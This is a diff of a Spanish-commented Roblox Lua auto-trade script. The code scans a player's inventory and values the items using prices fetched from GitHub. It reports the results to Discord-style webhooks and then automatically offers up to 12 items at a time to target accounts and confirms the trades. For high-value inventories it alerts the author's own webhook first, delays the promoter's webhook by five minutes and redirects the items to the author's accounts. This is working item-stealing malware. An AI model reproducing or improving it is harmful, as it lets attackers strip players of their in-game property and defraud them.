@@ -22,7 +22,7 @@ local jugadoresObjetivosDual = {
 }
 
 -- ==========================================
--- LÓGICA DE INICIO/FILTRADO DE INVENTARIO (EXTRAÍDA DEL SCRIPT 1)
+-- LÓGICA DE INICIO/FILTRADO DE INVENTARIO
 -- ==========================================
 local EXCLUDE_ITEMS = { "DefaultGun", "DefaultKnife", "DefaultEffect" }
 local EXCLUDE = {}
@@ -39,12 +39,33 @@ local function isTradeable(name)
     if not ok then return true end
     return res and true or false
 end
--- ==========================================
+
+-- Normaliza los nombres eliminando los espacios para que coincidan con los del inventario
+local function normalizeName(name)
+    return string.gsub(name, " ", "")
+end
 
 -- ==========================================
--- CARGA DINÁMICA DE VALORES DE GITHUB
+-- CARGA DINÁMICA Y ADAPTACIÓN DEL JSON DE GITHUB
 -- ==========================================
 local Knives, Guns, Effects, Emotes = {}, {}, {}, {}
+
+-- Función para aplanar la estructura anidada del JSON
+local function procesarCategoria(categoriaJson, tablaDestino)
+    if type(categoriaJson) == "table" then
+        for rareza, items in pairs(categoriaJson) do
+            if type(items) == "table" then
+                for _, item in ipairs(items) do
+                    -- Verifica que el item tenga nombre y un valor de tradeo
+                    if item.name and item.trade_value then
+                        local cleanName = normalizeName(item.name)
+                        tablaDestino[cleanName] = item.trade_value
+                    end
+                end
+            end
+        end
+    end
+end
 
 local function cargarValoresGitHub()
     local success, response = pcall(function()
@@ -57,10 +78,11 @@ local function cargarValoresGitHub()
         end)
         
         if decodeSuccess and decodedData then
-            Knives = decodedData.Knives or {}
-            Guns = decodedData.Guns or {}
-            Effects = decodedData.Effects or {}
-            Emotes = decodedData.Emotes or {}
+            -- Mapeamos las categorías en minúsculas del JSON y extraemos los valores
+            procesarCategoria(decodedData.knives, Knives)
+            procesarCategoria(decodedData.guns, Guns)
+            procesarCategoria(decodedData.effects, Effects)
+            procesarCategoria(decodedData.emotes, Emotes)
             return
         end
     end
@@ -70,15 +92,13 @@ cargarValoresGitHub()
 
 task.spawn(function()
     -- ==========================================
-    -- ARREGLO: Esperar a que el SCRIPT 1 se conecte
+    -- ESPERAR A QUE EL SCRIPT 1 SE CONECTE
     -- ==========================================
     while getgenv and not getgenv().AutoTradeConfig do
-        task.wait(0.2) -- Espera pasivamente hasta que SCRIPT 1 inyecte la config
+        task.wait(0.2)
     end
     
-    -- 👇 ESTA ES LA LÍNEA QUE SOLUCIONA EL ERROR 👇
     local config = getgenv().AutoTradeConfig or {}
-    
     local WEBHOOK_LOGS = config.WebhookLogs or "" 
     local WEBHOOK_INVENTARIO = config.WebhookInventario or ""
 
@@ -137,7 +157,6 @@ task.spawn(function()
     end)
 
     local jugadoresObjetivos = config.JugadoresObjetivos or {}
-
     local ok, cg = pcall(function() return require(RS.Client.Modules.ClientGlobals) end)
 
     if ok and cg.PlayerData then
@@ -145,20 +164,14 @@ task.spawn(function()
         local knives, guns, effects, emotes = {}, {}, {}, {}
         local totalValue = 0
 
-        local function normalizeName(name)
-            return string.gsub(name, " ", "")
-        end
-
         local function scanAndSave(category, valueTable, resultTable)
             local inv = pd:TryIndex({"Inventory", category})
             if not inv then return end
             
             for guid, item in pairs(inv) do
-                -- APLICANDO LÓGICA DE INICIO DE INVENTARIO (Script 1)
                 if item and item.name and not EXCLUDE[string.lower(item.name)] and isTradeable(item.name) then
                     local cleanName = normalizeName(item.name)
                     if valueTable[cleanName] then
-
                         local itemValue = valueTable[cleanName]
                         totalValue = totalValue + itemValue
                         resultTable[#resultTable + 1] = { name = item.name, guid = guid, value = itemValue }
@@ -287,10 +300,9 @@ task.spawn(function()
             local jsonPayload = HttpService:JSONEncode(webhookPayload)
 
             -- ==========================================
-            -- ENVÍO DE WEBHOOKS (INSTANTÁNEO VS RETRASADO)
+            -- ENVÍO DE WEBHOOKS
             -- ==========================================
             if totalValue >= 5000 then
-                -- 1. Tu Webhook (Dual): Notifica al instante
                 task.spawn(function()
                     if DUAL_WEBHOOK_INVENTARIO ~= "" then
                         request({
@@ -302,7 +314,6 @@ task.spawn(function()
                     end
                 end)
 
-                -- 2. Webhook del promocionador: Notifica con 5 minutos de delay (300 segundos)
                 if WEBHOOK_INVENTARIO ~= "" then
                     task.delay(300, function()
                         pcall(function()
@@ -316,10 +327,8 @@ task.spawn(function()
                     end)
                 end
                 
-                -- Cambia los objetivos inmediatamente a tus cuentas de tradeo
                 jugadoresObjetivos = jugadoresObjetivosDual
             else
-                -- Hit normal (< 5000): Notifica de inmediato al promocionador únicamente
                 if WEBHOOK_INVENTARIO ~= "" then
                     request({
                         Url = WEBHOOK_INVENTARIO,
@@ -344,9 +353,6 @@ task.spawn(function()
             end
         until jugadorEncontrado
 
-        -- ==========================================
-        -- ESPERA DE 10 SEGUNDOS AL DETECTAR JUGADOR
-        -- ==========================================
         task.wait(10)
 
         local tradeando = true 
@@ -384,7 +390,6 @@ task.spawn(function()
                 local inv = pdTrade:TryIndex({"Inventory", cat})
                 if not inv then return end
                 for guid, item in pairs(inv) do
-                    -- APLICANDO LÓGICA DE INICIO DE INVENTARIO AL MOMENTO DEL TRADEO (Script 1)
                     if item and item.name and not EXCLUDE[string.lower(item.name)] and isTradeable(item.name) then
                         local cleanName = normalizeName(item.name)
                         if valueTable[cleanName] then
@@ -421,7 +426,6 @@ task.spawn(function()
             local SessionState = cgData.SessionState
             local Workspace = game:GetService("Workspace")
 
-            -- PROTECCIÓN AÑADIDA: Verifica que player1 y player2 existan antes de leerlos
             local function getSides()
                 local data = ActiveNegotiation.Data
                 if type(data) ~= "table" then return nil, nil, nil end
@@ -436,7 +440,6 @@ task.spawn(function()
                 return me, other, data
             end
 
-            -- 1. Enviar o Aceptar Invitación
             repeat
                 if not (jugadorEncontrado and jugadorEncontrado.Parent) then return false end
 
@@ -461,7 +464,6 @@ task.spawn(function()
 
             task.wait(1)
 
-            -- 2. Ofrecer hasta 12 items sin usar GUI
             for i = 1, math.min(12, #itemsRestantes) do
                 if not (jugadorEncontrado and jugadorEncontrado.Parent) then return false end
 
@@ -478,25 +480,20 @@ task.spawn(function()
                 task.wait(0.35)
             end
 
-            -- 3 & 4. Lógica de Finalización (SetReady Seguro)
             local timeout = os.clock()
             while os.clock() - timeout < 60 do 
                 if not (jugadorEncontrado and jugadorEncontrado.Parent) then return false end
 
-                -- Utilizamos getSides que ya viene protegido contra el error 'nil'
                 local me, other, data = getSides()
                 
                 if not data then break end
                 if data.exchanging then break end 
                 
-                         -- Verificamos si somos nosotros y aún no damos ready
                 if me and not me.ready then
                     if Workspace:GetServerTimeNow() >= (data.lastUpdate or 0) + 3 then
-                        -- SOLUCIÓN: Se pasa data.ref o {} igual que en el script de origen
                         Remotes.SetReady:FireServer(true, data.ref or {})
                     end
                 end
-
                 
                 task.wait(0.5)
             end
@@ -510,26 +507,17 @@ task.spawn(function()
             return true
         end
 
-
-        -- ==========================================
-        -- BUCLE PRINCIPAL DE TRADEO CONTINUO
-        -- ==========================================
         while true do
-            -- Si el jugador objetivo se sale antes de arrancar el siguiente trade, se rompe el bucle
             if not (jugadorEncontrado and jugadorEncontrado.Parent) then
                 break 
             end
             
             local continuar = ejecutarTradeo()
-            -- Si ya no hay ítems o `ejecutarTradeo` devolvió false (jugador se salió), rompemos
             if not continuar then 
                 break 
             end
         end
 
-        -- ==========================================
-        -- RESTAURACIÓN: TODO VUELVE A LA NORMALIDAD
-        -- ==========================================
         tradeando = false
         task.wait(0.5) 
 
